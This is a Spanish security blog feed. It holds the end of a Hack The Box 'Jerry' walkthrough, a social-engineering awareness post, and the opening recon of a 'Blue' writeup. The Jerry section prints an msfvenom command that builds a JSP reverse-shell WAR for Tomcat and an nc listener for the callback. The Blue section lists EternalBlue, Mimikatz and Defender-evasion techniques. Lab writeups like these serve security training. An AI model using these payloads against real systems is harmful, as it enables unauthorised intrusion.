&lt;p&gt;Con este comando listamos los payloads disponibles en java, porque este nos permitirá generar el war malicioso. En este caso el que nos interesa es el que pone java/jsp_shell_reverse_tcp para entablarnos una conexión inversa en la maquina victima.&lt;/p&gt;

&lt;p&gt;Luego nos dirigimos al directorio content y creamos el payload con msfvenom.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; java/jsp_shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.4 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; war &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shell.war
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-16-25.png&quot; alt=&quot;Hackforce-2022-12-18-20-16-25.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listo ahi tendríamos nuestro war malicioso creado.&lt;/p&gt;

&lt;p&gt;Ahora nos movemos el war malicioso a nuestro directorio de descargas y lo subimos a tomcat.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-20-37.png&quot; alt=&quot;Hackforce-2022-12-18-20-20-37.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Así se miraría nuestro war malicioso en el servidor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-22-55.png&quot; alt=&quot;Hackforce-2022-12-18-20-22-55.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora nos ponemos en escucha con netcat y ejecutamos el war malicioso.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-25-47.png&quot; alt=&quot;Hackforce-2022-12-18-20-25-47.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Con esto deberíamos ganar acceso a la maquina y estaríamos como nt authority system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-29-47.png&quot; alt=&quot;Hackforce-2022-12-18-20-29-47.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Procedemos a buscar las flags y listo con esto terminaríamos la maquina.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-41-30.png&quot; alt=&quot;Hackforce-2022-12-18-20-41-30.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahi podemos visualizar las flags, que como vemos nos dan la de user y root.&lt;/p&gt;

&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios&lt;/h1&gt;

&lt;p&gt;En este caso la vulnerabilidad explotada nos brinda los privilegios máximos como NT authority System y podemos hacer cualquier cosa por lo que no hay que elevar privilegios.&lt;/p&gt;

&lt;p&gt;Listo con esto tendríamos hecha la maquina por completo, happy hacking.&lt;/p&gt;

&lt;p&gt;Les dejo la resolución de la misma por s4vitar &lt;a href=&quot;https://www.youtube.com/watch?v=bB-M5vPegMk&quot;&gt;Ver video&lt;/a&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="Information Leakage" /><category term="Tomcat" /><summary type="html">Jerry es una maquina donde estaremos explotando una vulnerabilidad en Tomcat, en el cual comprometeremos la maquina mediante un archivo war malicioso.</summary></entry><entry><title type="html">Ingeniería social y cómo protegerse</title><link href="http://localhost:4000/ingenier%C3%ADa-social/" rel="alternate" type="text/html" title="Ingeniería social y cómo protegerse" /><published>2023-01-16T00:00:00-06:00</published><updated>2023-01-16T00:00:00-06:00</updated><id>http://localhost:4000/ingenier%C3%ADa-social</id><content type="html" xml:base="http://localhost:4000/ingenier%C3%ADa-social/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/ingeniería-social2.jpg&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;ingeniería-social-y-cómo-protegerse&quot;&gt;Ingeniería social y cómo protegerse&lt;/h2&gt;

&lt;p&gt;La ingeniería social consiste en aquellas técnicas que permitan manipular a una persona para lograr que esta proporcione información relevante o lleve a cabo una acción propuesta por el atacante.&lt;/p&gt;

&lt;p&gt;Es muy importante aprender sobre la ingeniería social ya que es uno de los ataques más utilizados por los cibercriminales hoy en día y por esta razón es que necesitamos capacitarnos, para poder identificar este tipo de ataques y tener más segura nuestra información y la de las empresas.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/ingeniería-social.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Vamos a mencionar algo muy interesante:&lt;/p&gt;

&lt;p&gt;En cualquier cadena de seguridad, los humanos somos casi siempre el eslabón más débil, porque somos susceptibles de todo tipo de tácticas de manipulación.&lt;/p&gt;

&lt;p&gt;Como lo dice aqui arriba nosotros los humanos siempre vamos a ser la parte más débil de una empresa, por el simple hecho de que si no tenemos el concocimiento necesario podemos llegar a poner en riesgo a una empresa o nuestra información, ya que nosotros no poseemos un antivirus que nos indique que estamos ante un ataque de este tipo, tampoco poseemos actualizaciones etc.&lt;/p&gt;

&lt;p&gt;La mejor defensa ante este tipo de ataques es capacitarnos constantemente en temas de ciberseguridad.&lt;/p&gt;

&lt;p&gt;Un software puede ser muy seguro, pero si no poseemos el conocimiento necesario sobre este tipo de ataques es muy probable que ese software sea vulnerado por nuestra culpa.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;

&lt;img src=&quot;/assets/images/ingeniería-social/manipulados.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Hay muchos ataques de ingeniería social, pero solo miraremos algunos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Phishing&lt;/li&gt;
  &lt;li&gt;Vishing&lt;/li&gt;
  &lt;li&gt;Baiting&lt;/li&gt;
  &lt;li&gt;Adicionales (redes sociales, sms, etc.)&lt;/li&gt;
&lt;/ul&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/tipos-ataques.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Phishing:&lt;/p&gt;

&lt;p&gt;Envió de correos suplantando una determinada persona o la suplantación de aplicaciones web. Por lo general este tipo de ataque es uno de los más utilizados a día de hoy.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/phishing.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Vishing:&lt;/p&gt;

&lt;p&gt;Donde el atacante suplanta la identidad de una empresa o de una persona de confianza, con el fin de obtener información personal de sus víctimas. Es lo mismo que el ataque anterior, solo que este es mediante una llamada telefónica.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/vishing.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Baiting:&lt;/p&gt;

&lt;p&gt;Es el caso en el que un atacante deja un dispositivo infectado con malware (por ejemplo, una unidad USB) en algún lugar fácil de encontrar. Esto lo hacen por lo general con etiquetas llamativas, como documentos confidenciales, fotos nopor, y cosas que a las personas les de curiosidad y vayan corriendo a conectarlas a sus computadoras (nunca hagan eso).&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/baiting.jpeg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Adicionales:&lt;/p&gt;

&lt;p&gt;Técnicas de ingeniería social mediante redes sociales, mensajes de texto, etc. Ahora utilizan estos mismos ataques pero haciendo uso de las diferentes redes sociales que existen. En instagram por ejemplo es donde las personas pierden sus cuentas con bastante frecuencia y todo por hacer clic en enlaces que las envian amigos a los cuales ya les comprometieron esas cuentas, o simplemente porque ven un mensaje que dice que cerraran sus cuentas y no esto no es asi, lo unico que hacen al realizar estas acciones es caer en el juego de los ciberdelincuentes.&lt;/p&gt;

&lt;p&gt;Igual realizan las mismas técnicas pero mediante mensajes de texto, haciendose pasar por bancos, o servicios muy conocidos y que son utilizados por casi todas las personas, con el mismo fin de robarse nuestros datos.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/redessociales.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Ejemplos de ataques de ingeniería social a grandes Empresas.&lt;/p&gt;

&lt;p&gt;Tomaremos como ejemplo solo 2 empresas:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;RSA&lt;/li&gt;
  &lt;li&gt;Microsoft&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Miraremos cual fue la metodología que utilizaron los ciberdelincuentse para infiltrarse en estas empresas y obtener la información.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/ingenieriasocialempresas.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;RSA:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Suplantación y envió de correo.&lt;/li&gt;
  &lt;li&gt;Documento adjunto de Excel.&lt;/li&gt;
  &lt;li&gt;Uso de datos ’verídicos’ de planilla.&lt;/li&gt;
  &lt;li&gt;Explotación de vulnerabilidad en flash.&lt;/li&gt;
  &lt;li&gt;Compromiso de sistema interno.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Como podemos observar primero lograron entrar mediante un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phishing&lt;/code&gt;, utilizaron un documento de Excel que contenía código malicioso, el cual al ejecutarse explotaba una vulnerabilidad de flash que había en aquel entonces, y así lograron llegar hasta los sistemas internos de la empresa. Aquí es donde miramos la importancia de que el personal y tanto nosotros mismos estemos muy bien capacitados en todos estos temas para poder evitar este tipo de ataques.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/rsa.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Microsoft:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Llamada telefónica.&lt;/li&gt;
  &lt;li&gt;Obtención de números de seguridad social de empleados.&lt;/li&gt;
  &lt;li&gt;Reutilización en proveedores para el acceso a cuentas.&lt;/li&gt;
  &lt;li&gt;Obtención de información sensible sobre XBOX.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En este otro ejemplo, miramos que el punto de entrada fue un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vishing&lt;/code&gt;, así lograron persuadir y obtener el número de seguro social de los empleados y luego esta información la utilizaron en proveedores que los empleados tenían para obtener el acceso a sus cuentas. En este caso no fue tan crítico porque no comprometieron ningún sistema pero se dio lo que se conoce como data leak ya que se filtró información sobre la nueva Xbox que iba a salir en ese entonces, dando a conocer así las características que iba a poseer dicha consola.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/microsoft.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Ahora hablaremos de que técnicas emplean los ciberdelincuentes a la hora de elegir una empresa como objetivo, usan un ataque de ingeniería social dirigido y siguen una metodología para que el ataque sea más efectivo.&lt;/p&gt;

&lt;p&gt;Antes de saber cuál es la metodología que emplean, hay que mencionar que existen dos tipos de ataques de ingeniería social:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Dirigidos&lt;/li&gt;
  &lt;li&gt;No Dirigidos&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Dirigidos:
Son aquellos ataques en el que se tienes una empresa o una persona como objetivo, siguiendo una metodología para que el ataque logre ser más efectivo. Por ejemplo el ataque que hicieron a la empresa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Uber&lt;/code&gt; el cual consistió en un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phishing&lt;/code&gt;, y a partir de aquí los ciberdelincuentes lograron vulnerar sus sistemas.&lt;/p&gt;

&lt;p&gt;No Dirigidos:
Por lo general este tipo de ataque se realiza de manera masiva enviando millones de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phishing&lt;/code&gt; a usuarios al azar, con la finalidad de hacerse con la mayor cantidad de información posible y así obtener una recompensa mayor. Cabe mencionar que estos ataques son menos efectivos que los Dirigidos ya que no estudian a fondo su víctima.&lt;/p&gt;

&lt;p&gt;La metodología que utilizan los ciberdelincuentes para un ataque dirigido seria la siguiente:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Investigación sobre la organización y empleados de la misma.&lt;/li&gt;
  &lt;li&gt;Análisis y planificación de posibles vectores.&lt;/li&gt;
  &lt;li&gt;Definición de empleados objetivo y análisis en profundidad.&lt;/li&gt;
  &lt;li&gt;Desarrollo de pretextos y escenarios.&lt;/li&gt;
  &lt;li&gt;Despliegue de la infraestructura necesaria.&lt;/li&gt;
  &lt;li&gt;Ejecución de pruebas.&lt;/li&gt;
  &lt;li&gt;Intrusión en la red interna.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Como observamos siguen una metodología bien elaborada con la finalidad de que el ataque resulte ser muy efectivo para que logren caer los empleados de las empresas y así hacerse con sus datos para luego comprometer toda la empresa. Esto nos lleva a que los empleados de una empresa y nosotros como usuarios de cualquier tecnología debemos estar capacitados en temas de ciberseguridad para así lograr mitigar estos ataques ya que no hay otra manera de evitarlos, la única forma es estar debidamente informados.
Esta metodología también la utilizan los pentester en ejercicios de red team para simular completamente un ataque de ingeniería social usando las mismas técnicas que un ciberdelincuente, de esta manera estarían preparando al personal de una empresa para cualquier tipo de ataque de este tipo y haciendo más segura la empresa.&lt;/p&gt;

&lt;p&gt;En el primer punto usan técnicas &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OSINT&lt;/code&gt; para recolectar la mayor cantidad de información posible sobre el objetivo.&lt;/p&gt;

&lt;p&gt;En el segundo ya una vez reunida esa información la analizan y miran cual podría ser el mejor vector de ataque si un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phishing&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vishing&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;baiting&lt;/code&gt;, etc. o también puede usar todas las que ellos crean convenientes.&lt;/p&gt;

&lt;p&gt;Después lo que hacen es analizar cuál podría ser el empleado o los empleados elegidos para atacar, ya que por ejemplo sería más efectivo si utilizan a alguien de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recursos humanos&lt;/code&gt; que si eligen a alguien de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IT&lt;/code&gt;, ya que al ser del departamento &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IT&lt;/code&gt; podría darse cuenta más rápido y evitar que logren comprometer la empresa.&lt;/p&gt;

&lt;p&gt;Aquí en este punto van a ver cómo hacer caer a los empleados, haciéndoles creer que son parte del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;equipo de soporte&lt;/code&gt; o que son algún &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proveedor&lt;/code&gt; con la finalidad de que los empleados les den acceso o sus datos para colarse dentro de la empresa.&lt;/p&gt;

&lt;p&gt;Ya en este punto crean todo lo que van a utilizar como por ejemplo en que área dejaran las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;USB&lt;/code&gt; tiradas en caso de ser un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;baiting&lt;/code&gt;, si es un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phishing&lt;/code&gt; pues elaborar cuidadosamente y lo más parecido posible la plantilla de correo y al sitio donde serán redirigidos los empleados o el documento que van a adjuntar para lograr tener la mayor efectividad.&lt;/p&gt;

&lt;p&gt;Ya aquí ejecutan las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pruebas&lt;/code&gt; para ver si serán efectivas y en caso de serla estaríamos llegando al último punto que sería la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;intrusión&lt;/code&gt; en la red interna de la empresa y ya con esto estarían logrando su objetivo.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/ataquessocial2.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Ahora que ya vimos que es y cómo funciona la ingeniería social, es hora de aprender cómo evitar este tipo de ataques, para ello vamos a tener en cuenta un par de consejos:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Cambie la configuración de spam en el correo electrónico:
No todos los proveedores de correos vienen debidamente configurados así que es nuestra responsabilidad configurarlos correctamente para así poder filtrar la mayor parte de correos y tener un poco más segura nuestra bandeja de entrada.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Investigue la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fuente&lt;/code&gt;:
Siempre que se reciba un enlace, un mensaje, un correo, etc. Es muy importante verificar de donde proviene y no importa si es por parte de un amigo hay que estar seguro que en realidad es el quien n os envía y no un ciberdelincuente que pudo haber quitado el acceso a la cuenta de nuestro amigo.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Si algo parece demasiado bueno para ser cierto, seguramente sea &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;falso&lt;/code&gt;:
Esto es algo muy común en estos tipos de ataques ya que por lo general te dirán que te ganaste algo sin siquiera estar participando, a partir de este momento deberíamos de alertarnos ya que seguramente se trate de un ataque de ingeniería social, es muy común también que las personas caigan más debido a estas técnicas ya que depende de nuestro nivel de economía en que nos encontremos seremos tentados a caer en este tipo de engaños pero recuerda como dicen por ahí &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nada es gratis&lt;/code&gt; y si lo es tiene un precio tu &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;información&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Utilice software de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;seguridad&lt;/code&gt; y confianza:
Nunca este de mas tener de la mano un buen software antivirus y anti malware, para así tener una mayor protección ante este tipo de ataques, aunque sin duda alguna la mejor defensa siempre será estar concientizado ante este tipo de ataques y sobre ciberseguridad, recuerda la ciberseguridad no es un gasto es una inversión como el seguro de un auto, no adquieres el seguro porque vas a chocar el auto si no que en caso de que suceda estas preparado para lo que pueda pasarle a este, es lo mismo a la hora de invertir en ciberseguridad para tu empresa, no quiere decir que pasaras bajo constate ataque, pero en caso de recibir uno tu personal estará debidamente capacitado y podrán evitar que comprometan la empresa.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Utilice el sentido &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;común&lt;/code&gt;:
Es algo muy curioso y parece sencillo de usar, pero a veces digo que el sentido común no parece tan común ya que algunos simplemente no lo usan. Siempre hay que estar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alerta&lt;/code&gt; ante cualquier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msj&lt;/code&gt; sospechoso que recibamos y más si es mediante una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;red social&lt;/code&gt;, nunca abrir &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;links&lt;/code&gt; que te envíen por ahí a menos que sepas su procedencia, así que ya sabes si recibes algo y no estás seguro es mejor que no hagas clic ya que podrían robar tu información personal o tus cuentas.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Sobre todo y no menos importante informarse y concientizarse sobre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ciberseguridad&lt;/code&gt;:
Creo que este es uno de los puntos más importantes, ya que al menos para mí hoy en día es imprescindible que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;todos&lt;/code&gt; y si me refiero a todos aquellos que utilicemos un dispositivo para navegar por internet y que poseamos redes sociales, etc. En fin usar cualquier dispositivo tecnológico debemos aprender sobre ciberseguridad ya que la tecnología cada día crece a pasos agigantados y así como salen dispositivos nuevos, redes sociales nuevas y así con cada cosa, también salen nuevos ataques, nuevas técnicas que utilizan los ciberdelincuentes para hacerse con nuestros datos. Por eso es importante que aprendamos ya que al hacerlo sabremos lo peligros a los cuales nos enfrentamos e igual conoceremos multitud de ataques que existen y seremos más cuidadosos a la hora de navegar por internet.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/consejos.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Ahora conociendo todo esto nos haremos la siguiente interrogante ¿Por qué es tan peligrosa la ingeniería social?&lt;/p&gt;

&lt;p&gt;La ingeniería social puede ocurrirle a cualquiera, ya sea en persona, por teléfono o en línea, y también es un método bastante fácil cuando se realizan estafas, fraudes u otros delitos. Los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ciberdelincuentes&lt;/code&gt; no necesitan tener grandes conocimientos técnicos; solo tienen que ser capaces de engañarle para que les entregues datos sensibles. El hecho de que todos estemos en riesgo hace que sea una estafa potencialmente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;devastadora&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Las redes sociales han ayudado a los ciberdelincuentes a ser más habilidosos, creando perfiles falsos que parecen ser reales, o incluso suplantando a personas reales. Es importante estar alerta ante perfiles extraños o desconocidos en redes sociales.&lt;/p&gt;

&lt;p&gt;Por estos motivos es uno de los ataques más peligrosos ya que es directamente con el usuario que se trata y no con el software.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/peligro.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Ya para ir concluyendo con el post, te dejare un par de herramientas que seguramente te ayudaran a la hora de identificar este tipo de ataques.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https:https://www.virustotal.com/gui/home/upload&quot;&gt;Virus Total&lt;/a&gt;:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Es una herramienta muy conocida, y lo que nos permite hacer es identificar archivos maliciosos, enlaces, ip, dominios, etc. Es una herramienta que sin duda alguna debemos tener a la mano para poder identificar de una mejor manera todo aquello de lo que nosotros tengamos duda o sospecha.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/virustotal.png&quot; /&gt;
&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://phishtank.org/&quot;&gt;Phishtank&lt;/a&gt;:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Es una web que como su nombre lo indica es un tanque de sitios desde donde se realiza phishing, lo que nos permite hacer es que si tenemos duda de una web y ya fue reportada en el sitio web nos dira si es un phishing o no, en el caso de que no nos arroje información tampoco quiere decir que es seguro, simplmente no este reportada. También nos permite poder reportar una pagina que nosotros estemos seguros que sirve para hacer phishing, aportando nuestro granito de arena a la comunidad.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/phishtank.png&quot; /&gt;
&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://expandurl.net/&quot;&gt;Expandurl&lt;/a&gt;:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Es una web sencilla pero muy útil ya que nos permite ver la url final de un enlace acortado, permitiéndonos ver hacia donde nos redirigirá esa url sin necesidad de visitarla.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/expandurl.png&quot; /&gt;
&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://phishingquiz.withgoogle.com/?hl=es-419&quot;&gt;phishingquiz&lt;/a&gt;:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una web creada por google para entrenarnos a la hora de identificar ataques de phishing, en el cual se nos presentara una serie de correos y nosotros deberemos ir tomando decisiones y decidir si se trata de un correo legítimo o phishing. Sin duda alguna una excelente herramienta para ayudarnos a detectar de una mejor manera este tipo de ataques y nos entrenara para fijarnos en aquellos detalles que antes no les prestábamos atención.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ingeniería-social/googlephish.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Con esto concluimos el post espero les sirva de ayuda y nos vemos en el siguiente, ayúdame compartiendo mi sitio con tus amigos, gracias.&lt;/strong&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="Ingeniería Social" /><summary type="html">¿Te gustaría aprender un poco sobre Ingeniería social?, pues toma un refresco y palomitas.</summary></entry><entry><title type="html">Blue - Hack The Box</title><link href="http://localhost:4000/blue-hackthebox/" rel="alternate" type="text/html" title="Blue - Hack The Box" /><published>2023-01-15T00:00:00-06:00</published><updated>2023-01-15T00:00:00-06:00</updated><id>http://localhost:4000/blue-hackthebox</id><content type="html" xml:base="http://localhost:4000/blue-hackthebox/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/Blue_htb.png&quot; alt=&quot;Blue_htb.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Certificaciones a aplicar: OSCP&lt;/p&gt;

&lt;p&gt;Dificultad: Fácil&lt;/p&gt;

&lt;p&gt;Habilidades:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;SMB Enumeration&lt;/li&gt;
  &lt;li&gt;Eternalblue Exploitation (MS17-010) [d4t4s3c Exploit]&lt;/li&gt;
  &lt;li&gt;Obtaining credentials stored in memory [MIMIKATZ + Windows Defender Evasion] (EXTRA)&lt;/li&gt;
  &lt;li&gt;Enabling RDP from CrackMapExec (EXTRA)&lt;/li&gt;
  &lt;li&gt;Windows Persistence techniques (EXTRA)&lt;/li&gt;
  &lt;li&gt;Persistence + Windows Defender Evasion [Playing with Ebowla] (EXTRA)&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;ip-de-la-maquina&quot;&gt;IP de la Maquina&lt;/h1&gt;

&lt;p&gt;10.10.10.40&lt;/p&gt;

&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h1&gt;

&lt;p&gt;Identificando el sistema operativo&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whichSystem.py 10.10.10.40
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/sistema_operativo.png&quot; alt=&quot;sistema operativo.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Escaneo de los puertos&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/escaneo.png&quot; alt=&quot;escaneo.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Función extractPorts&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extractPorts allPorts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/puertos.png&quot; alt=&quot;puertos.png&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;análisis-de-vulnerabilidades&quot;&gt;Análisis de Vulnerabilidades&lt;/h1&gt;

&lt;p&gt;Buscando versiones y servicios que corren para esos puertos&lt;/p&gt;

